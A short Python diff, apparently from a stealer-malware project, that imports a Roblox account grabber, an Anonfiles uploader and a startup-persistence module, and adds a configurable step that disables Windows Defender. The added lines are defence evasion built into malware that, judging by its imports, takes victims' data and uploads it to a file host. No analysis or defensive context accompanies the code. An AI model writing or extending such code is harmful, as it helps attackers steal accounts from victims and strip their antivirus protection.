@@ -38,6 +38,7 @@ try:
     from _roblox import RobloxX
     from anonFile import uploadToAnonfiles
     from startup import StartUp
+    from disable_defender import disabledefender
 except Exception:
     requirementsinstallation()
 
@@ -54,6 +55,9 @@ if cc.get_fake_error() == True:
 
 if cc.get_start_up() == True:
     StartUp()
+    
+if cc.get_disable_windows_defender() == True:
+    disabledefender()
 
 
 def writeforfile(data, name):
